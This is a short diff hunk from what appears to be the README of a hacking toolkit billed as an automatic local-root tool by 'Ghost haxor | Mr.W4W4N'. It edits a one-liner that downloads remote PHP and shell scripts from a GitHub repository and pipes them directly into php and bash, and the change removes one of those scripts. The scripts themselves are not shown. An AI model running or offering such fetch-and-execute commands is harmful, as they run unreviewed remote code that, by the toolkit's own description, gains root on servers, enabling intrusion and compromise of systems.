@@ -65,7 +65,7 @@ curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/putu
 
 # Kita Oplosan defend
 ```
-curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/ch.php | php && curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/glandang | php && curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/putus.sh | bash
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/ch.php | php && curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/putus.sh | bash
 ```
 
 ☠️ Powerfull Auto root Localroot By Ghost haxor | Mr.W4W4N ☠️
